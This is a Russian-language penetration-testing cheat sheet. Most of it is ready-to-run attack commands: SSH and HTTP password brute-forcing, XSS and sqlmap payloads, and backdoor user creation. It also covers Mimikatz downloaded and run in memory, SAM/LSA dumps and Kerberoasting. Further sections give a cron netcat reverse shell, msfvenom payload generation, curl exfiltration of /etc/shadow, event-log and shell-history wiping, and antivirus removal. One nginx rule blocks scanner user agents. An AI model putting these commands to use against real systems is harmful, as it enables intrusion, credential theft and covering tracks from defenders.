Скрипты автоматизации
====
## SSH
Проблема подключения putty к SSH через ключ

```
echo ‘PubkeyAcceptedAlgorithms +ssh-rsa’ >> /etc/ssh/sshd_config
```
Перебор паролей:

```
hydra -V -f -t 4 -l root -P pass.txt ssh://172.16.60.1
```

```
nmap -p22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt 172.16.60.1
```


## Веб
Методология OWASP

1. сбор информации (Краулинг) nmap, dnscan, google, whatweb, burp spider
2. тестирование конфигурации (dirbuster, http method, )
3. тестирование механизмов идентификации (burp+secList)
4. тестирование механизмов аутентификации (Recovery)
5. тестирование механизмов авторизации (DirTraversal, Id Inc, FileBrute)
6. тестирование механизмов управления сессиями (Cookie, CSRF)
7. тестирование валидации входных данных (XSS, SQLi, XML, LDAP, XPATH, HTTP-Splitting)
8. тестирование обработки ошибок (ERROR handle)
9. тестирование на предмет некриптостойкого шифрования (SSL/TLS)
10. тестирование бизнес-логики приложения (Валидация данных, бизнес-логики, загрузка данных)
11. тестирование механизмов безопасности клиентской части(XSS,JavaScript-инъекции, Clickjacking, WebSockets;)

***Межсайтовый скриптинг:***

```
"><img src=# onerror="alert(xss)">
"><script>alert(1)</script>
<img src=x onerror=alert(1)/>
<svg onload=alert('XSS')>
1"--><svg/onload=';alert(0);'>

```
***Набор данных для фаззинга:***

https://github.com/Bo0oM/fuzz.txt
https://github.com/danielmiessler/SecLists

***Sqlmap***
```
sqlmap -r target1 --dbms=mssql --all --hex --tamper=space2comment,between,charencode --level=5 --risk=3
```

***Basic брут***
```
hydra -L tomcat_user.txt -P tomcat_pass.txt -f alic.trust.localhost -s 7012 http-get /manager/html
```
***Брут битрксового хеша***
```
hashcat -a 0 -m 20 pass.txt /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt
```

***Заблокировать вредоносные агенты***
```
 if ($http_user_agent ~* (^curl|wallarm|bot|scan|monotor|xyz|package|python|w3af.sourceforge.net|dirbuster|nikto|wpscan|SF|sqlmap|fimap|nessus|whatweb|Openvas|jbrofuzz|libwhisker|webshag|acunetix|nmap|wikto|bsqlbf|havij|appscan|wpscan|ApacheBench|w3af|Arachni|XSpider|Hydra|Evas$))
 {return 418;}

```

***Проверить пароль для сертификата***
```
openssl rsa -noout -in суке.pem -passin 'pass:**********' 2>/dev/null && echo 'Valid' || echo 'Not Valid'
```

## Python   
Проблема установки пакетов pip в корпоративной среде, варианты решения:
1. export HTTPS_PROXY=https://172.16.70.1:8888/ && export HTTP_PROXY=http://172.16.70.1:8888/ или set HTTPS_PROXY=https://172.16.70.1:8888/  && set HTTP_PROXY=http://172.16.70.1:8888/
2. pip3 install GitPython --proxy="https://172.16.70.1:8888" --global http.sslVerify false --trusted-host 172.16.70.1 --trusted-host pypi.org --trusted-host files.pythonhosted.org --trusted-host 172.16.70.1
3. pip install --index-url https://user:pass@nexus.company.local/repository/Python-group/simple GitPython

## Сбор сведений 
Поиск хоста без антивируса

```
wmic /Node:"host1" /USER:"domain\user" /namespace:\\root\SecurityCenter2 path AntiVirusProduct get * /value | findstr /V /B /C:displayName || echo No Antivirus installed
WMIC /Node:"host1","host2" /USER:"domain\user" /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /value
wmic /Node:@C:\tmp\targets.txt /USER:"domain\user" /namespace:\\root\SecurityCenter2 path AntiVirusProduct get * /value
```

## Повышение привилегий

**Linux** 

pwnkit --  https://github.com/PwnFunction/CVE-2021-4034 
```
adduser user
usermod -aG sudo user 
mkdir /home/user/.ssh
echo 'ssh-rsa AAAAB3N.....lbigkey root@myserver.local' >> /home/user/.ssh/id_rsa.pub
chmod -R 600 /home/user/.ssh
chown -R user:user /home/user/.ssh
echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
echo 'Match User user' >> /etc/ssh/sshd_config
echo '    PasswordAuthentication no' >> /etc/ssh/sshd_config
echo 'PubkeyAcceptedAlgorithms +ssh-rsa' >> /etc/ssh/sshd_config

sudo systemctl restart sshd
```


Найти всех sudoers

```
SUID: find / -perm -u=s -type f 2>/dev/null
```

**Windows**

Mimikatz
```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
powershell -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```
LinPEAS
    https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

WinPEAS
    https://github.com/carlospolop/PEASS-ng/

Найти не экранированные сервисы (подробнее: https://juggernaut-sec.com/unquoted-service-paths/):

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\windows\\" | findstr /i /v """
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
```
Поиск учетных записей в реестре

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

LSA Dump

```
reg save HKLM\SYSTEM system.save 
reg save HKLM\security security.save
reg save hklm\sam sam.save

secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## Active Directory

Как получить учётную запись в AD:
[  ] Прослушивание траффика
[  ] Password spray
[  ] LLNR, WPAD, spoof responder
[  ] Ipv6 attack mitm6
[  ] Mitm + DNS fake+ Portal fake = intercepter-ng
[  ] Поиск общедоступных шар crakmapexec, WinGrep
[  ] Поиск серверов с уязвимостью
[  ] Wiki, confluence, jira


**Поиск Gpp** 
```
findstr /S /I cpassword \\domain.trust.localhost\sysvol\vestik\policies\*.xml
```
**SPN учетки** 
```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 172.16.1.1 trust.localhost/ptuser -request
[W] Get-NetUser -SPN -Server srv1.trust.localhost -Credential $cred | select serviceprincipalname
[L] ldapsearch -LLL -x -H ldap://172.16.1.1 -D "capitan@trust.localhost" -W -b "dc=trust,dc=localhost" "servicePrincipalName=*" sAMAccountName servicePrincipalName
hashcat -m 13100 --force <TGSs_file> <passwords_file>
for i in $(find -name '*.txt'); do hashcat -m 13100 --force tgt_ticket.txt "$i"; done >> /tmp/brute_tgt.log
```


## SMB
Шары

```
smbmap -u shut -p nik123 -H alloc.trust.localhost -d trust.localhost (-q -R --depth 5 -A 'passw' --exclude ADMIN$ IPC$ C$ --host-file hosts.txt)
crackmapexec smb inv1.trust.localhost -u shut -p nik123 -d trust.localhost --put-file k1.exe  \\k1.exe
wmic /node:alloc.trust.localhost /user:'trust.localhost\shut' /password:nik123 share list \\172.16.1.1
enum4linux -a -u shut -p nik123 -w trust.localhost alloc.trust.localhost
```

Монтирование шары:
```
sudo apt install cifs-utils && sudo mkdir /mnt/win_share && sudo mount -t cifs -o username=shut //nas.trust.localhost/WORK/logs /mnt/win_share
```

## Получить хеш файла
Windows
```
Echo 'Certutil -hashfile %1 MD5' >>C:\md5.bat
```
Linux
```
 md5sum ex.xml
```

## OpenVPN

***Генерируем статические ключи***
```
openvpn --genkey --secret static.key
```

***Конфигурация сервера***
```
dev tun
ifconfig 172.27.0.1 172.27.0.2 #Сервер клиент
secret static.key
proto tcp-server
port 443
```

***Конфигурация клиента***

```
dev tun
remote 192.168.1.110
port 443
proto tcp-client
ifconfig 172.27.0.2 172.27.0.1 #клиент Сервер
route 172.27.1.0 255.255.255.0 172.27.0.1
route 10.1.1.0 255.255.255.0 172.27.0.1
cipher AES-256-CBC
secret D:\\vlab\\static.key
script-security 2                                                                                                       
dhcp-option DNS 172.16.1.1                                                                                           
dhcp-option DOMAIN trust.localhost
```

## PowerShell && Передача файлов

Скачать
```
powershell "IEX(New-Object Net.WebClient).downloadString('http://nur1.files.kz/robots.txt')"
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://nur1.files.kz/robots.txt')|iex"
smbmap -u vboxuser -p Qwerty123 -H 172.16.1.1 -x 'certutil.exe -urlcache -f  http://172.16.1.3:8888/Rubeus.exe Rubeus.exe'
bitsadmin /transfer myDownloadJob /download /priority normal http://172.16.1.3:8888/Rubeus.exe c:\Rubeus.exe
```

## Закрепление
Windows

```
schtasks /create /tn Update /tr "file" /sc onlogon /ru System #minite
```

linux

```
(crontab -l;printf "*/1 * * * * nc ip_server_to_connect 3000 -e /bin/bash\n")|crontab -

nc -vlkp 3000 2>/dev/null
```

## Генерация нагрузки
```
msfvenom -p windows/meterpreter/reverse_winhttps lhost=172.16.7.2 lport=443 -e x86/xor_dynamic -f exe > idm4.exe
```

## RDP

```
rdp_check <domain>/<name>:<password>@<IP>
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.186.81 /u:'Administrator' /p:'Password321'
```

## Эксфильтрафия 

Linux

```
sudo grep '\$' /etc/shadow | base64 | tr -d '\n' |xargs -I @ curl http://172.16.72.1/hash/@

```
## Настройка Kali

```
apt-get update && apt-get upgrade -y
apt-get install terminator -y
apt install docker.io -y
```

## Скрытие следов

Windows
```
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
Clear-Eventlog -LogName Application,Security,System
wevtutil cl security && wevtutil cl application && wevtutil cl system
```

Linux

```
echo "" /var/log/auth.log
echo "" ~/.bash_history
history -c
export HISTFILESIZE=0 && export HISTSIZE=0 || unset HISTFILE (logout)
```

Удаление антивируса

```
wmic product get name /value 
wmic product where name="AVP" call uninstall /nointeractive
```

## Проброс портов
Windows

```
netsh interface portproxy add v4tov4 listenport=8001 listenaddress=192.168.0.10 connectport=80 connectaddress=192.168.0.10
netsh interface portproxy add v4tov4 listenport=8001 connectport=80 connectaddress=127.0.0.1
netsh interface portproxy show all
```

Linux

```
ssh -L 3336:db001.host:3306 user@pub001.host
```

